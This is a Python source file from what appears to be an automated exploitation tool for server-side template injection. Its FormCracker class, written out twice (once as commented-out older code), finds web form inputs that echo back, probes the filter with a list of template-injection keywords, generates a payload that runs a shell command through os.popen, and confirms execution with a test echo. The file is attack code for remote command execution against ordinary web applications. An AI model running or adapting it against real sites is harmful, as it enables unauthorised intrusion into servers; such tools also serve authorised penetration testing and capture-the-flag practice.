from collections import namedtuple
import logging
from typing import List, Dict, Any, Union, Callable

from .form import random_fill, fill_form
from .requester import Requester
from .colorize import colored
from .const import *
from .waf_func_gen import WafFuncGen
from .full_payload_gen import FullPayloadGen

logger = logging.getLogger("form_cracker")
Result = namedtuple("Result", "full_payload_gen input_field")


class FormCracker:
    """
    对指定的文档进行攻击
    """
    dangerous_keywords = [
        "config", "self", "os", "class", "mro", "base", "request",
        "attr", "open", "system",
        "[", '"', "'", "_", ".", "+", "{{", "|",
        "0", "1", "2",
    ]
    test_cmd = "echo f3n  j1ng;"
    test_result = "f3n j1ng"

    def __init__(
            self,
            url: str,
            form: Dict[str, Any],
            requester: Requester,
            callback: Union[Callable[[str, Dict], None], None] = None
    ):
        """生成用于攻击form的类

        Args:
            url (str, optional): form所在的url.
            form (dict): 解析后的form元素
            requester (Requester, optional): 用于发出请求的requester，为None时自动构造.
            callback (Union[Callable[[str, Dict], None], None]): callback函数，在完成某些阶段后会调用此函数
        """
        self.url = url
        self.form = form
        self.req = requester
        self.callback: Callable[[str, Dict], None] = callback if callback else (
            lambda x, y: None)
        self.waf_func_gen = WafFuncGen(self.url, self.form, self.req, self.callback)

    def vulunable_inputs(self) -> List[str]:
        """解析出form中有回显的input

        Returns:
            List[str]: 所有有回显的input name
        """
        fill_dict = random_fill(self.form)
        r = self.req.request(
            **fill_form(
                self.url,
                self.form,
                form_inputs=fill_dict))
        assert r is not None
        return [
            k for k, v in fill_dict.items()
            if v in r.text
        ]

    def submit(self, inputs: dict):
        """根据inputs提交form

        Args:
            inputs (dict): 需要提交的input

        Returns:
            requests.Response: 返回的reponse元素
        """
        all_length = sum(len(v) for v in inputs.values())
        if all_length > 2048 and self.form["method"] == "GET":
            logger.warning(
                f"inputs are extremely long (len={all_length}) that the request might fail")

        r = self.req.request(
            **fill_form(self.url, self.form, inputs))

        self.callback(CALLBACK_SUBMIT, {
            "form": self.form,
            "inputs": inputs,
            "response": r,
        })

        return r

    def test_input(self, input_field, payload):
        logger.info(
            f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
        r = self.submit({input_field: payload})
        assert r is not None
        return self.test_result in r.text

    def crack_inputs(self, input_field: str) -> Union[Result, None]:
        """攻击对应的input

        Args:
            input_field (str): 需要攻击的input

        Returns:
            Union[Result, None]: 对应的payload生成函数，以及对应的input
        """
        logger.info(f"Testing {colored('yellow', input_field)}")

        waf_func = self.waf_func_gen.generate(input_field)
        full_payload_gen = FullPayloadGen(waf_func, callback=self.callback)
        payload, will_print = full_payload_gen.generate(
            OS_POPEN_READ, self.test_cmd)
        if payload is None:
            self.callback(CALLBACK_TEST_FORM_INPUT, {
                "ok": False,
            })
            return None

        is_test_success = None  # payload测试成功时为True, 失败时为False, 无法测试为None
        if will_print:
            if self.test_input(input_field, payload):
                logger.info(
                    f"{colored('green', 'Success!')} Now we can generate payloads.")
            else:
                logger.info(
                    f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
        else:
            logger.info(
                f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
                "You can try generating payloads anyway.")

        self.callback(CALLBACK_TEST_FORM_INPUT, {
            "ok": True,
            "will_print": will_print,
            "test_success": is_test_success,
            "input_field": input_field
        })
        return Result(
            full_payload_gen=full_payload_gen,
            input_field=input_field
        )

    def crack(self) -> Union[Result, None]:
        """攻击表单

        Returns:
            Union[Result, None]: 对应的payload生成函数，以及对应的input
        """
        logger.info(f"Start cracking {self.form}")
        vulunables = self.vulunable_inputs()
        logger.info(
            f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")

        for input_field in vulunables:
            result = self.crack_inputs(input_field)
            if result:
                return result
        logger.warning(f"Failed...")
        return None

# class FormCracker:
#     """
#     对指定的文档进行攻击
#     """
#     dangerous_keywords = [
#         "config", "self", "os", "class", "mro", "base", "request",
#         "attr", "open", "system",
#         "[", '"', "'", "_", ".", "+", "{{", "|",
#         "0", "1", "2",
#     ]
#     test_cmd = "echo f3n  j1ng;"
#     test_result = "f3n j1ng"

#     def __init__(
#             self,
#             form: Dict[str, Any],
#             method: str = "POST",
#             inputs: List[str] | None = None,
#             url: Union[str, None] = None,
#             action: Union[str, None] = None,
#             requester: Union[Requester, None] = None,
#             request_interval: float = 0.0
#     ):
#         """生成用于攻击form的类

#         Args:
#             form (dict): 解析后的form元素
#             method (str, optional): form的提交方法. Defaults to "POST".
#             inputs (list, optional): form的输入. Defaults to None.
#             url (str, optional): form所在的url. Defaults to None.
#             action (str, optional): form的action, 为None时和url相同. Defaults to None.
#             requester (Requester, optional): 用于发出请求的requester，为None时自动构造. Defaults to None.
#             request_interval (float, optional): 请求的间隔，用于构造requester. Defaults to 0.
#         """
#         self.url = url
#         if form:
#             self.form = form
#         else:
#             assert method is not None and inputs is not None and url is not None, \
#                 "[method, inputs, url] should not be None!"  # for typing
#             self.form = Form(
#                 method=method,
#                 inputs=inputs,
#                 action=action or urlparse(url).path
#             )
#         if requester:
#             self.req = requester
#         else:
#             self.req = Requester(
#                 interval=request_interval
#             )

#     def vulunable_inputs(self) -> List[str]:
#         """解析出form中有回显的input

#         Returns:
#             List[str]: 所有有回显的input name
#         """
#         fill_dict = random_fill(self.form)
#         r = self.req.request(
#             **fill_form(
#                 self.url,
#                 self.form,
#                 form_inputs=fill_dict))
#         assert r is not None
#         return [
#             k for k, v in fill_dict.items()
#             if v in r.text
#         ]

#     def submit(self, inputs: dict):
#         """根据inputs提交form

#         Args:
#             inputs (dict): 需要提交的input

#         Returns:
#             requests.Response: 返回的reponse元素
#         """
#         all_length = sum(len(v) for v in inputs.values())
#         if all_length > 2048 and self.form["method"] == "GET":
#             logger.warning(
#                 f"inputs are extremely long (len={all_length}) that the request might fail")
#         return self.req.request(
#             **fill_form(self.url, self.form, inputs))

#     def waf_page_hash(self, input_field: str):
#         """使用危险的payload测试对应的input，得到一系列响应后，求出响应中最常见的几个hash

#         Args:
#             input_field (str): 需要测试的input

#         Returns:
#             List[int]: payload被waf后页面对应的hash
#         """
#         resps = {}
#         for keyword in self.dangerous_keywords:
#             logger.info(
#                 f"Testing dangerous keyword {colored('yellow', repr(keyword * 3))}")
#             resps[keyword] = self.submit({input_field: keyword * 3})
#         # resps = {
#         #     keyword: self.submit({input_field: keyword * 3})
#         #     for keyword in self.dangerous_keywords
#         # }
#         hashes = [
#             hash(r.text) for keyword, r in resps.items()
#             if r is not None and r.status_code != 500 and keyword not in r.text
#         ]
#         return [pair[0] for pair in Counter(hashes).most_common(2)]

#     def crack_inputs(self, input_field: str) -> Union[Result, None]:
#         """攻击对应的input

#         Args:
#             input_field (str): 需要攻击的input

#         Returns:
#             Union[Result, None]: 对应的payload生成函数，以及对应的input
#         """
#         logger.info(f"Testing {colored('yellow', input_field)}")

#         waf_hashes = self.waf_page_hash(input_field)

#         @lru_cache(1000)
#         def waf_func(value):
#             r = self.submit({input_field: value})
#             assert r is not None
#             return hash(r.text) not in waf_hashes

#         payload, will_echo = exec_cmd_payload(waf_func, self.test_cmd)
#         if payload is None:
#             return None
#         if will_echo:
#             logger.info(
#                 f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
#             r = self.submit({input_field: payload})
#             assert r is not None
#             if self.test_result in r.text:
#                 logger.info(
#                     f"{colored('green', 'Success!')} Now we can generate payloads.")
#             else:
#                 logger.info(
#                     f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
#             return Result(
#                 payload_generate_func=(
#                     lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
#                 input_field=input_field
#             )
#         else:
#             logger.info(
#                 f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
#                 "You can try generating payloads anyway.")
#             return Result(
#                 payload_generate_func=(
#                     lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
#                 input_field=input_field
#             )

#     def crack(self) -> Union[Result, None]:
#         """攻击表单

#         Returns:
#             Union[Result, None]: 对应的payload生成函数，以及对应的input
#         """
#         logger.info(f"Start cracking {self.form}")
#         vulunables = self.vulunable_inputs()
#         logger.info(
#             f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")

#         for input_field in vulunables:
#             result = self.crack_inputs(input_field)
#             if result:
#                 return result
#         logger.warning(f"Failed...")
#         return None
